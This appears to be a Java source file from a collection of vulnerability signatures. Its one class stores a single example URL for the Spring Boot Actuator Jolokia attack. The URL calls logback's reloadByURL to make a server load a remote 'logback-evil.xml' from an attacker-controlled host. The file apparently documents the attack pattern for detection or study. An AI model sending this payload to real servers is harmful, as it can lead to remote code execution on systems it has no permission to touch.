package com.threedr3am.bug.feature;

/**
 *
 * actuator + jolokia bug特征
 *
 * @author threedr3am
 */
public class JolokiaAttackUrlFeature {

  String exampleURL = "http://localhost:8080/" + "jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/" + "http:!/!/127.0.0.1:8888!/logback-evil.xml";
}
